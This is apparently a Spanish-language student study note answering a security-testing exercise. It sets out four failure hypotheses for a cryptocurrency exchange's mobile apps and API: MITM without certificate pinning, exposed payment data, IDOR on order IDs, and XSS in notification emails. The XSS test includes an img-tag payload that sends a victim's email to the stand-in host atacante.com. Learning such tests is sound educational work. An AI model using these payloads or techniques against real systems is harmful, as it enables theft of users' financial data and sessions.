> [!example] Enunciado
> Una exchange de criptomonedas está expandiendo su app web con apps nativas Android e iOS. La app se comunica vía API REST; requiere registro con email y contraseña; sin autenticarse se puede ver un resumen de precios y volumen (público). Para ingresar dinero se usa tarjeta de crédito o cuenta bancaria (datos registrados y almacenados por la plataforma, ya que el proveedor externo AlphaPay no los guarda). Para retirar, solo transferencia bancaria. Se notifica por email la ejecución de órdenes.
>
> Establecer 4 hipótesis de falla pertinentes basadas en problemas de seguridad en aplicaciones, con prueba concreta para cada una.

**Conceptos:**

* [[Certificate Pinning]]
* [[Sensitive Data Exposure]]
* [[Broken Access Control]]
* [[CWE-79 - XSS]]

**Hipótesis 1: Falta de [[Certificate Pinning]] en la app móvil — MITM**
- **Qué:** Interceptación del tráfico por falta de certificate pinning.
- **Por qué:** App móvil nativa nueva sin certificate pinning permite instalar un certificado propio y proxear el tráfico HTTPS.
- **Cómo:** Emulador con proxy (Burp Suite) y certificado propio; observar si se intercepta el tráfico.
- **Impacto:** Ver credenciales, tokens de sesión, datos de tarjetas/cuentas en tránsito — robo directo de fondos.

**Hipótesis 2: [[Sensitive Data Exposure]] — Datos de medios de pago mal almacenados**
- **Qué:** Datos de tarjeta/cuenta bancaria almacenados de forma insegura.
- **Por qué:** AlphaPay no guarda esos datos, así que la plataforma sí los almacena — el enunciado no dice cómo se protegen.
- **Cómo:** Examinar qué devuelve `GET /api/medios-de-pago` (¿número completo o enmascarado?); intentar SQL injection en endpoints relacionados.
- **Impacto:** Filtración de datos financieros de todos los usuarios (violación PCI).

**Hipótesis 3: [[Broken Access Control]] — Acceso a órdenes de otros usuarios**
- **Qué:** Un usuario accede a órdenes/cuentas ajenas manipulando IDs.
- **Por qué:** Si los endpoints solo verifican autenticación, cualquier ID de orden es accesible.
- **Cómo:** Interceptar `GET /api/ordenes/{id_orden}` propia y cambiar el ID por otro; repetir con medios de pago y retiros.
- **Impacto:** Ver saldos e historiales ajenos; en el peor caso, iniciar retiros a cuenta propia usando sesión ajena.

**Hipótesis 4: XSS a través de los emails de notificación**
- **Qué:** [[CWE-79 - XSS|Cross-Site Scripting]] inyectado vía campos que aparecen en emails de notificación.
- **Por qué:** Si algún campo controlado por el usuario se incluye sin sanitizar en el email de notificación de orden.
- **Cómo:** Crear una orden con un campo tipo `<img src="https://atacante.com/track?email=victima">` o script, y verificar si el email lo renderiza sin sanitizar.
- **Impacto:** Ejecutar código en el webmail de la víctima, robar cookies o redirigir a phishing.
